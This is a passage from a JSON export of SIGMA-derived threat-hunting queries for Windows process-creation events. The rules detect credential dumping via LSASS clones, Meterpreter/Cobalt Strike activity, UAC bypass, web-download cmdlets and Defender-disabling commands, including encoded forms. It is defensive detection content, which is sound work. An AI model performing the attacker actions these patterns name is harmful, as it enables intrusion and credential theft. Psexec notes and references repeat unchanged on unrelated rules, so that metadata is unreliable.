            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\brave.exe\" or tgt.process.image.path contains \"\\chrome.exe\" or tgt.process.image.path contains \"\\msedge.exe\" or tgt.process.image.path contains \"\\opera.exe\" or tgt.process.image.path contains \"\\vivaldi.exe\") and tgt.process.cmdline contains \"http\" and (tgt.process.cmdline contains \".7z\" or tgt.process.cmdline contains \".dat\" or tgt.process.cmdline contains \".dll\" or tgt.process.cmdline contains \".exe\" or tgt.process.cmdline contains \".hta\" or tgt.process.cmdline contains \".ps1\" or tgt.process.cmdline contains \".psm1\" or tgt.process.cmdline contains \".txt\" or tgt.process.cmdline contains \".vbe\" or tgt.process.cmdline contains \".vbs\" or tgt.process.cmdline contains \".zip\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1211
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious sysprep process start with AppData folder as target (as used by Trojan Syndicasec in Thrip report by Symantec)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Sysprep on AppData Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\sysprep.exe\" and tgt.process.cmdline contains \"\\AppData\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1212
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a WMI backdoor in Exchange Transport Agents via WMI event filters",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1546"
            ],
            "name": "WMI Backdoor Exchange Transport Agent",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\EdgeTransport.exe\" and (not (tgt.process.image.path=\"C:\\Windows\\System32\\conhost.exe\" or (tgt.process.image.path contains \"C:\\Program Files\\Microsoft\\Exchange Server\\\" and tgt.process.image.path contains \"\\Bin\\OleConverter.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1213
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of an encoded/obfuscated version of an IP address (hex, octal, etc.) via command line",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Obfuscated IP Via CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\ping.exe\" or tgt.process.image.path contains \"\\arp.exe\") and ((tgt.process.cmdline contains \" 0x\" or tgt.process.cmdline contains \"//0x\" or tgt.process.cmdline contains \".0x\" or tgt.process.cmdline contains \".00x\") or (tgt.process.cmdline contains \"http://%\" and tgt.process.cmdline contains \"%2e\") or (tgt.process.cmdline matches \"https?://[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.0[0-9]{3,4}\" or tgt.process.cmdline matches \"https?://[0-9]{1,3}\\\\.0[0-9]{3,7}\" or tgt.process.cmdline matches \"https?://0[0-9]{3,11}\" or tgt.process.cmdline matches \"https?://(0[0-9]{1,11}\\\\.){3}0[0-9]{1,11}\" or tgt.process.cmdline matches \"https?://0[0-9]{1,11}\" or tgt.process.cmdline matches \" [0-7]{7,13}\")) and (not tgt.process.cmdline matches \"https?://((25[0-5]|(2[0-4]|1\\\\d|[1-9])?\\\\d)(\\\\.|\\\\b)){4}\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1214
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Usage Of Web Request Commands And Cmdlets",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"[System.Net.WebRequest]::create\" or tgt.process.cmdline contains \"curl \" or tgt.process.cmdline contains \"Invoke-RestMethod\" or tgt.process.cmdline contains \"Invoke-WebRequest\" or tgt.process.cmdline contains \"iwr \" or tgt.process.cmdline contains \"Net.WebClient\" or tgt.process.cmdline contains \"Resume-BitsTransfer\" or tgt.process.cmdline contains \"Start-BitsTransfer\" or tgt.process.cmdline contains \"wget \" or tgt.process.cmdline contains \"WinHttp.WinHttpRequest\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1215
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of SOAPHound, a .NET tool for collecting Active Directory data, using specific command-line arguments that may indicate an attempt to extract sensitive AD information.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1087"
            ],
            "name": "HackTool - SOAPHound Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" --buildcache \" or tgt.process.cmdline contains \" --bhdump \" or tgt.process.cmdline contains \" --certdump \" or tgt.process.cmdline contains \" --dnsdump \") and (tgt.process.cmdline contains \" -c \" or tgt.process.cmdline contains \" --cachefilename \" or tgt.process.cmdline contains \" -o \" or tgt.process.cmdline contains \" --outputdirectory\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1216
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious LSASS process process clone that could be a sign of credential dumping activity",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003",
                "t1003"
            ],
            "name": "Potential Credential Dumping Via LSASS Process Clone",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\Windows\\System32\\lsass.exe\" and tgt.process.image.path contains \"\\Windows\\System32\\lsass.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1217
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service starting",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1134",
                "t1134"
            ],
            "name": "Potential Meterpreter/CobaltStrike Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\services.exe\" and (((tgt.process.cmdline contains \"/c\" and tgt.process.cmdline contains \"echo\" and tgt.process.cmdline contains \"\\pipe\\\") and (tgt.process.cmdline contains \"cmd\" or tgt.process.cmdline contains \"%COMSPEC%\")) or (tgt.process.cmdline contains \"rundll32\" and tgt.process.cmdline contains \".dll,a\" and tgt.process.cmdline contains \"/p:\")) and (not tgt.process.cmdline contains \"MpCmdRun\"))) | columns ComputerName,tgt.process.user,tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1218
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via winrm.vbs and copied cscript.exe (can be renamed)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "AWL Bypass with Winrm.vbs and Malicious WsmPty.xsl/WsmTxt.xsl",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"winrm\" and ((tgt.process.cmdline contains \"format:pretty\" or tgt.process.cmdline contains \"format:\\\"pretty\\\"\" or tgt.process.cmdline contains \"format:\\\"text\\\"\" or tgt.process.cmdline contains \"format:text\") and (not (tgt.process.image.path contains \"C:\\Windows\\System32\\\" or tgt.process.image.path contains \"C:\\Windows\\SysWOW64\\\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1219
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects when the Console Window Host (conhost.exe) process is spawned by an uncommon parent process, which could be indicative of potential code injection activity.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Conhost Spawned By Uncommon Parent Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\conhost.exe\" and (src.process.image.path contains \"\\explorer.exe\" or src.process.image.path contains \"\\lsass.exe\" or src.process.image.path contains \"\\regsvr32.exe\" or src.process.image.path contains \"\\rundll32.exe\" or src.process.image.path contains \"\\services.exe\" or src.process.image.path contains \"\\smss.exe\" or src.process.image.path contains \"\\spoolsv.exe\" or src.process.image.path contains \"\\svchost.exe\" or src.process.image.path contains \"\\userinit.exe\" or src.process.image.path contains \"\\wininit.exe\" or src.process.image.path contains \"\\winlogon.exe\")) and (not (src.process.cmdline contains \"-k apphost -s AppHostSvc\" or src.process.cmdline contains \"-k imgsvc\" or src.process.cmdline contains \"-k localService -p -s RemoteRegistry\" or src.process.cmdline contains \"-k LocalSystemNetworkRestricted -p -s NgcSvc\" or src.process.cmdline contains \"-k NetSvcs -p -s NcaSvc\" or src.process.cmdline contains \"-k netsvcs -p -s NetSetupSvc\" or src.process.cmdline contains \"-k netsvcs -p -s wlidsvc\" or src.process.cmdline contains \"-k NetworkService -p -s DoSvc\" or src.process.cmdline contains \"-k wsappx -p -s AppXSvc\" or src.process.cmdline contains \"-k wsappx -p -s ClipSVC\")) and (not (src.process.cmdline contains \"C:\\Program Files (x86)\\Dropbox\\Client\\\" or src.process.cmdline contains \"C:\\Program Files\\Dropbox\\Client\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1220
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect suspicious parent processes of well-known Windows processes",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036",
                "t1036"
            ],
            "name": "Windows Processes Suspicious Parent Directory",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\svchost.exe\" or tgt.process.image.path contains \"\\taskhost.exe\" or tgt.process.image.path contains \"\\lsm.exe\" or tgt.process.image.path contains \"\\lsass.exe\" or tgt.process.image.path contains \"\\services.exe\" or tgt.process.image.path contains \"\\lsaiso.exe\" or tgt.process.image.path contains \"\\csrss.exe\" or tgt.process.image.path contains \"\\wininit.exe\" or tgt.process.image.path contains \"\\winlogon.exe\") and (not (((src.process.image.path contains \"\\SavService.exe\" or src.process.image.path contains \"\\ngen.exe\") or (src.process.image.path contains \"\\System32\\\" or src.process.image.path contains \"\\SysWOW64\\\")) or ((src.process.image.path contains \"\\Windows Defender\\\" or src.process.image.path contains \"\\Microsoft Security Client\\\") and src.process.image.path contains \"\\MsMpEng.exe\") or (not (src.process.image.path matches \"\\.*\") or src.process.image.path=\"-\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1221
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1615"
            ],
            "name": "Gpresult Display Group Policy Information",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\gpresult.exe\" and (tgt.process.cmdline contains \"/z\" or tgt.process.cmdline contains \"/v\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1222
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using Consent and Comctl32 - Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\consent.exe\" and tgt.process.image.path contains \"\\werfault.exe\" and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1223
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects requests to disable Microsoft Defender features using PowerShell commands",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Powershell Defender Disable Scan Feature",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"Add-MpPreference \" or tgt.process.cmdline contains \"Set-MpPreference \") and (tgt.process.cmdline contains \"DisableArchiveScanning \" or tgt.process.cmdline contains \"DisableRealtimeMonitoring \" or tgt.process.cmdline contains \"DisableIOAVProtection \" or tgt.process.cmdline contains \"DisableBehaviorMonitoring \" or tgt.process.cmdline contains \"DisableBlockAtFirstSeen \" or tgt.process.cmdline contains \"DisableCatchupFullScan \" or tgt.process.cmdline contains \"DisableCatchupQuickScan \") and (tgt.process.cmdline contains \"$true\" or tgt.process.cmdline contains \" 1 \")) or ((tgt.process.cmdline contains \"ZGlzYWJsZWFyY2hpdmVzY2FubmluZy\" or tgt.process.cmdline contains \"Rpc2FibGVhcmNoaXZlc2Nhbm5pbmcg\" or tgt.process.cmdline contains \"kaXNhYmxlYXJjaGl2ZXNjYW5uaW5nI\" or tgt.process.cmdline contains \"RGlzYWJsZUFyY2hpdmVTY2FubmluZy\" or tgt.process.cmdline contains \"Rpc2FibGVBcmNoaXZlU2Nhbm5pbmcg\" or tgt.process.cmdline contains \"EaXNhYmxlQXJjaGl2ZVNjYW5uaW5nI\" or tgt.process.cmdline contains \"ZGlzYWJsZWJlaGF2aW9ybW9uaXRvcmluZy\" or tgt.process.cmdline contains \"Rpc2FibGViZWhhdmlvcm1vbml0b3Jpbmcg\" or tgt.process.cmdline contains \"kaXNhYmxlYmVoYXZpb3Jtb25pdG9yaW5nI\" or tgt.process.cmdline contains \"RGlzYWJsZUJlaGF2aW9yTW9uaXRvcmluZy\" or tgt.process.cmdline contains \"Rpc2FibGVCZWhhdmlvck1vbml0b3Jpbmcg\" or tgt.process.cmdline contains \"EaXNhYmxlQmVoYXZpb3JNb25pdG9yaW5nI\" or tgt.process.cmdline contains \"ZGlzYWJsZWJsb2NrYXRmaXJzdHNlZW4g\" or tgt.process.cmdline contains \"Rpc2FibGVibG9ja2F0Zmlyc3RzZWVuI\" or tgt.process.cmdline contains \"kaXNhYmxlYmxvY2thdGZpcnN0c2Vlbi\" or tgt.process.cmdline contains \"RGlzYWJsZUJsb2NrQXRGaXJzdFNlZW4g\" or tgt.process.cmdline contains \"Rpc2FibGVCbG9ja0F0Rmlyc3RTZWVuI\" or tgt.process.cmdline contains \"EaXNhYmxlQmxvY2tBdEZpcnN0U2Vlbi\" or tgt.process.cmdline contains \"ZGlzYWJsZWNhdGNodXBmdWxsc2Nhbi\" or tgt.process.cmdline contains \"Rpc2FibGVjYXRjaHVwZnVsbHNjYW4g\" or tgt.process.cmdline contains \"kaXNhYmxlY2F0Y2h1cGZ1bGxzY2FuI\" or tgt.process.cmdline contains \"RGlzYWJsZUNhdGNodXBGdWxsU2Nhbi\" or tgt.process.cmdline contains \"Rpc2FibGVDYXRjaHVwRnVsbFNjYW4g\" or tgt.process.cmdline contains \"EaXNhYmxlQ2F0Y2h1cEZ1bGxTY2FuI\" or tgt.process.cmdline contains \"ZGlzYWJsZWNhdGNodXBxdWlja3NjYW4g\" or tgt.process.cmdline contains \"Rpc2FibGVjYXRjaHVwcXVpY2tzY2FuI\" or tgt.process.cmdline contains \"kaXNhYmxlY2F0Y2h1cHF1aWNrc2Nhbi\" or tgt.process.cmdline contains \"RGlzYWJsZUNhdGNodXBRdWlja1NjYW4g\" or tgt.process.cmdline contains \"Rpc2FibGVDYXRjaHVwUXVpY2tTY2FuI\" or tgt.process.cmdline contains \"EaXNhYmxlQ2F0Y2h1cFF1aWNrU2Nhbi\" or tgt.process.cmdline contains \"ZGlzYWJsZWlvYXZwcm90ZWN0aW9uI\" or tgt.process.cmdline contains \"Rpc2FibGVpb2F2cHJvdGVjdGlvbi\" or tgt.process.cmdline contains \"kaXNhYmxlaW9hdnByb3RlY3Rpb24g\" or tgt.process.cmdline contains \"RGlzYWJsZUlPQVZQcm90ZWN0aW9uI\" or tgt.process.cmdline contains \"Rpc2FibGVJT0FWUHJvdGVjdGlvbi\" or tgt.process.cmdline contains \"EaXNhYmxlSU9BVlByb3RlY3Rpb24g\" or tgt.process.cmdline contains \"ZGlzYWJsZXJlYWx0aW1lbW9uaXRvcmluZy\" or tgt.process.cmdline contains \"Rpc2FibGVyZWFsdGltZW1vbml0b3Jpbmcg\" or tgt.process.cmdline contains \"kaXNhYmxlcmVhbHRpbWVtb25pdG9yaW5nI\" or tgt.process.cmdline contains \"RGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZy\" or tgt.process.cmdline contains \"Rpc2FibGVSZWFsdGltZU1vbml0b3Jpbmcg\" or tgt.process.cmdline contains \"EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nI\") or (tgt.process.cmdline contains \"RABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgA\" or tgt.process.cmdline contains \"QAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIA\" or tgt.process.cmdline contains 